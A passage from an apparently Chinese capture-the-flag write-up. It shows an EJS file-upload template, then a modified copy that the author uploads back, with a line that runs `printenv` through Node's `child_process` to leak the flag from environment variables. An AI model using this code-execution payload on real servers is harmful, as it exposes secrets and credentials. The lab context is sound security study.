class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Ave Mujica&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        :root &#123;</span><br><span class="line">            --bg-color: #1a1a1a;</span><br><span class="line">            --text-color: #e0e0e0;</span><br><span class="line">            --accent-color: #ff4444;</span><br><span class="line">            --border-color: #333;</span><br><span class="line">            --hover-color: #2a2a2a;</span><br><span class="line">            --button-bg: #ff4444;</span><br><span class="line">            --button-hover: #ff6666;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body &#123; </span><br><span class="line">            padding: 20px;</span><br><span class="line">            margin: 0;</span><br><span class="line">            font-family: &#x27;Segoe UI&#x27;, Arial, sans-serif;</span><br><span class="line">            background-color: var(--bg-color);</span><br><span class="line">            color: var(--text-color);</span><br><span class="line">            min-height: 100vh;</span><br><span class="line">            background-image: url(&#x27;/static/UmiTaki.webp&#x27;);</span><br><span class="line">            background-size: cover;</span><br><span class="line">            background-position: center;</span><br><span class="line">            background-attachment: fixed;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body::before &#123;</span><br><span class="line">            content: &#x27;&#x27;;</span><br><span class="line">            position: fixed;</span><br><span class="line">            top: 0;</span><br><span class="line">            left: 0;</span><br><span class="line">            right: 0;</span><br><span class="line">            bottom: 0;</span><br><span class="line">            background: rgba(26, 26, 26, 0.85);</span><br><span class="line">            z-index: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .container &#123;</span><br><span class="line">            max-width: 800px;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">            padding: 20px;</span><br><span class="line">            position: relative;</span><br><span class="line">            z-index: 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h2 &#123;</span><br><span class="line">            color: var(--accent-color);</span><br><span class="line">            font-size: 2em;</span><br><span class="line">            margin-bottom: 1.5em;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 2px;</span><br><span class="line">            text-align: center;</span><br><span class="line">            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .upload-section &#123;</span><br><span class="line">            padding: 2em;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .upload-form &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            gap: 20px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-input-container &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        input[type=&quot;file&quot;] &#123;</span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-input-label &#123;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            padding: 12px 24px;</span><br><span class="line">            color: white;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 1px;</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            background-color: var(--accent-color);</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(255, 68, 68, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button[type=&quot;submit&quot;] &#123;</span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            padding: 12px 24px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 1px;</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            background-color: var(--accent-color);</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(255, 68, 68, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-section &#123;</span><br><span class="line">            padding: 2em;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-list &#123;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item &#123;</span><br><span class="line">            margin: 10px 0;</span><br><span class="line">            padding: 15px 20px;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            transition: all 0.3s ease;</span><br><span class="line">            border: 2px solid var(--accent-color);</span><br><span class="line">            background: transparent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item:hover &#123;</span><br><span class="line">            background: var(--accent-color);</span><br><span class="line">            transform: translateX(5px);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-name &#123;</span><br><span class="line">            font-size: 1.1em;</span><br><span class="line">            color: var(--text-color);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-image &#123;</span><br><span class="line">            max-width: 200px;</span><br><span class="line">            transition: transform 0.3s ease;</span><br><span class="line">            margin-top: 2em;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-image:hover &#123;</span><br><span class="line">            transform: scale(1.05);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .selected-file-name &#123;</span><br><span class="line">            position: absolute;</span><br><span class="line">            bottom: -25px;</span><br><span class="line">            left: 50%;</span><br><span class="line">            transform: translateX(-50%);</span><br><span class="line">            color: var(--accent-color);</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            max-width: 200px;</span><br><span class="line">            overflow: hidden;</span><br><span class="line">            text-overflow: ellipsis;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @keyframes fadeIn &#123;</span><br><span class="line">            from &#123; opacity: 0; transform: translateY(20px); &#125;</span><br><span class="line">            to &#123; opacity: 1; transform: translateY(0); &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item &#123;</span><br><span class="line">            animation: fadeIn 0.5s ease forwards;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h2&gt;Ave Mujica ! ! ! !!&lt;/h2&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;div class=&quot;upload-section&quot;&gt;</span><br><span class="line">            &lt;form id=&quot;uploadForm&quot; class=&quot;upload-form&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;file-input-container&quot;&gt;</span><br><span class="line">                    &lt;label class=&quot;file-input-label&quot; for=&quot;fileInput&quot;&gt;</span><br><span class="line">                        选择文件</span><br><span class="line">                    &lt;/label&gt;</span><br><span class="line">                    &lt;input id=&quot;fileInput&quot; type=&quot;file&quot; name=&quot;file&quot; required&gt;</span><br><span class="line">                    &lt;div id=&quot;selectedFileName&quot; class=&quot;selected-file-name&quot;&gt;&lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;button type=&quot;submit&quot;&gt;上传文件&lt;/button&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;meme-section&quot;&gt;</span><br><span class="line">            &lt;div id=&quot;fileList&quot; class=&quot;file-list&quot;&gt;</span><br><span class="line">                &lt;% if (files &amp;&amp; files.length &gt; 0) &#123; %&gt;</span><br><span class="line">                    &lt;% files.forEach(function(file) &#123; %&gt;</span><br><span class="line">                        &lt;div class=&quot;file-item&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;file-name&quot;&gt;&lt;%= file %&gt;&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;% &#125;); %&gt;</span><br><span class="line">                &lt;% &#125; else &#123; %&gt;</span><br><span class="line">                    &lt;p style=&quot;text-align: center; color: rgba(255,255,255,0.5);&quot;&gt;我们的乐队蒸蒸日上&lt;/p&gt;</span><br><span class="line">                    &lt;p style=&quot;display: none;&quot;&gt;只是UmiTaki而已&lt;/p&gt;</span><br><span class="line">                &lt;% &#125; %&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;img src=&quot;/static/Eruption.jpg&quot; alt=&quot;表情包&quot; class=&quot;meme-image&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // 显示选择的文件名</span><br><span class="line">        document.getElementById(&#x27;fileInput&#x27;).addEventListener(&#x27;change&#x27;, function(e) &#123;</span><br><span class="line">            const fileName = e.target.files[0]?.name || &#x27;&#x27;;</span><br><span class="line">            document.getElementById(&#x27;selectedFileName&#x27;).textContent = fileName;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        // 上传文件</span><br><span class="line">        document.getElementById(&#x27;uploadForm&#x27;).onsubmit = async (e) =&gt; &#123;</span><br><span class="line">            e.preventDefault();</span><br><span class="line">            const formData = new FormData(e.target);</span><br><span class="line">            </span><br><span class="line">            try &#123;</span><br><span class="line">                const response = await fetch(&#x27;/upload&#x27;, &#123;</span><br><span class="line">                    method: &#x27;POST&#x27;,</span><br><span class="line">                    body: formData</span><br><span class="line">                &#125;);</span><br><span class="line">                const result = await response.json();</span><br><span class="line">                if (result.error) &#123;</span><br><span class="line">                    alert(result.error);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    alert(result.message);</span><br><span class="line">                    window.location.reload();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (err) &#123;</span><br><span class="line">                alert(&#x27;上传失败: &#x27; + err.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>试了下发现常见的地方都找不到flag，那么flag应该是在环境变量中，给这个ejs加点料进去再传回去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Ave Mujica&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        :root &#123;</span><br><span class="line">            --bg-color: #1a1a1a;</span><br><span class="line">            --text-color: #e0e0e0;</span><br><span class="line">            --accent-color: #ff4444;</span><br><span class="line">            --border-color: #333;</span><br><span class="line">            --hover-color: #2a2a2a;</span><br><span class="line">            --button-bg: #ff4444;</span><br><span class="line">            --button-hover: #ff6666;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body &#123; </span><br><span class="line">            padding: 20px;</span><br><span class="line">            margin: 0;</span><br><span class="line">            font-family: &#x27;Segoe UI&#x27;, Arial, sans-serif;</span><br><span class="line">            background-color: var(--bg-color);</span><br><span class="line">            color: var(--text-color);</span><br><span class="line">            min-height: 100vh;</span><br><span class="line">            background-image: url(&#x27;/static/UmiTaki.webp&#x27;);</span><br><span class="line">            background-size: cover;</span><br><span class="line">            background-position: center;</span><br><span class="line">            background-attachment: fixed;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        body::before &#123;</span><br><span class="line">            content: &#x27;&#x27;;</span><br><span class="line">            position: fixed;</span><br><span class="line">            top: 0;</span><br><span class="line">            left: 0;</span><br><span class="line">            right: 0;</span><br><span class="line">            bottom: 0;</span><br><span class="line">            background: rgba(26, 26, 26, 0.85);</span><br><span class="line">            z-index: 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .container &#123;</span><br><span class="line">            max-width: 800px;</span><br><span class="line">            margin: 0 auto;</span><br><span class="line">            padding: 20px;</span><br><span class="line">            position: relative;</span><br><span class="line">            z-index: 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h2 &#123;</span><br><span class="line">            color: var(--accent-color);</span><br><span class="line">            font-size: 2em;</span><br><span class="line">            margin-bottom: 1.5em;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 2px;</span><br><span class="line">            text-align: center;</span><br><span class="line">            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .upload-section &#123;</span><br><span class="line">            padding: 2em;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .upload-form &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            gap: 20px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-input-container &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        input[type=&quot;file&quot;] &#123;</span><br><span class="line">            display: none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-input-label &#123;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            padding: 12px 24px;</span><br><span class="line">            color: white;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 1px;</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            background-color: var(--accent-color);</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(255, 68, 68, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button[type=&quot;submit&quot;] &#123;</span><br><span class="line">            color: white;</span><br><span class="line">            border: none;</span><br><span class="line">            padding: 12px 24px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            text-transform: uppercase;</span><br><span class="line">            letter-spacing: 1px;</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            background-color: var(--accent-color);</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(255, 68, 68, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-section &#123;</span><br><span class="line">            padding: 2em;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-list &#123;</span><br><span class="line">            margin-bottom: 2em;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item &#123;</span><br><span class="line">            margin: 10px 0;</span><br><span class="line">            padding: 15px 20px;</span><br><span class="line">            border-radius: 5px;</span><br><span class="line">            transition: all 0.3s ease;</span><br><span class="line">            border: 2px solid var(--accent-color);</span><br><span class="line">            background: transparent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item:hover &#123;</span><br><span class="line">            background: var(--accent-color);</span><br><span class="line">            transform: translateX(5px);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-name &#123;</span><br><span class="line">            font-size: 1.1em;</span><br><span class="line">            color: var(--text-color);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-image &#123;</span><br><span class="line">            max-width: 200px;</span><br><span class="line">            transition: transform 0.3s ease;</span><br><span class="line">            margin-top: 2em;</span><br><span class="line">            border-radius: 10px;</span><br><span class="line">            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .meme-image:hover &#123;</span><br><span class="line">            transform: scale(1.05);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .selected-file-name &#123;</span><br><span class="line">            position: absolute;</span><br><span class="line">            bottom: -25px;</span><br><span class="line">            left: 50%;</span><br><span class="line">            transform: translateX(-50%);</span><br><span class="line">            color: var(--accent-color);</span><br><span class="line">            font-size: 0.9em;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            max-width: 200px;</span><br><span class="line">            overflow: hidden;</span><br><span class="line">            text-overflow: ellipsis;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @keyframes fadeIn &#123;</span><br><span class="line">            from &#123; opacity: 0; transform: translateY(20px); &#125;</span><br><span class="line">            to &#123; opacity: 1; transform: translateY(0); &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .file-item &#123;</span><br><span class="line">            animation: fadeIn 0.5s ease forwards;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h2&gt;Ave Mujica ! ! ! !!&lt;/h2&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;div class=&quot;upload-section&quot;&gt;</span><br><span class="line">            &lt;form id=&quot;uploadForm&quot; class=&quot;upload-form&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;file-input-container&quot;&gt;</span><br><span class="line">                    &lt;label class=&quot;file-input-label&quot; for=&quot;fileInput&quot;&gt;</span><br><span class="line">                        选择文件</span><br><span class="line">                    &lt;/label&gt;</span><br><span class="line">                    &lt;input id=&quot;fileInput&quot; type=&quot;file&quot; name=&quot;file&quot; required&gt;</span><br><span class="line">                    &lt;div id=&quot;selectedFileName&quot; class=&quot;selected-file-name&quot;&gt;&lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;button type=&quot;submit&quot;&gt;上传文件&lt;/button&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;pre&gt;</span><br><span class="line">&lt;%- process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;printenv&#x27;).toString() %&gt;</span><br><span class="line">        &lt;/pre&gt;</span><br><span class="line">        &lt;div class=&quot;meme-section&quot;&gt;</span><br><span class="line">            &lt;div id=&quot;fileList&quot; class=&quot;file-list&quot;&gt;</span><br><span class="line">                &lt;% if (files &amp;&amp; files.length &gt; 0) &#123; %&gt;</span><br><span class="line">                    &lt;% files.forEach(function(file) &#123; %&gt;</span><br><span class="line">                        &lt;div class=&quot;file-item&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;file-name&quot;&gt;&lt;%= file %&gt;&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;% &#125;); %&gt;</span><br><span class="line">                &lt;% &#125; else &#123; %&gt;</span><br><span class="line">                    &lt;p style=&quot;text-align: center; color: rgba(255,255,255,0.5);&quot;&gt;我们的乐队蒸蒸日上&lt;/p&gt;</span><br><span class="line">                    &lt;p style=&quot;display: none;&quot;&gt;只是UmiTaki而已&lt;/p&gt;</span><br><span class="line">                &lt;% &#125; %&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;img src=&quot;/static/Eruption.jpg&quot; alt=&quot;表情包&quot; class=&quot;meme-image&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // 显示选择的文件名</span><br><span class="line">        document.getElementById(&#x27;fileInput&#x27;).addEventListener(&#x27;change&#x27;, function(e) &#123;</span><br><span class="line">            const fileName = e.target.files[0]?.name || &#x27;&#x27;;</span><br><span class="line">            document.getElementById(&#x27;selectedFileName&#x27;).textContent = fileName;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        // 上传文件</span><br><span class="line">        document.getElementById(&#x27;uploadForm&#x27;).onsubmit = async (e) =&gt; &#123;</span><br><span class="line">            e.preventDefault();</span><br><span class="line">            const formData = new FormData(e.target);</span><br><span class="line">            </span><br><span class="line">            try &#123;</span><br><span class="line">                const response = await fetch(&#x27;/upload&#x27;, &#123;</span><br><span class="line">                    method: &#x27;POST&#x27;,</span><br><span class="line">                    body: formData</span><br><span class="line">                &#125;);</span><br><span class="line">                const result = await response.json();</span><br><span class="line">                if (result.error) &#123;</span><br><span class="line">                    alert(result.error);</span><br><span 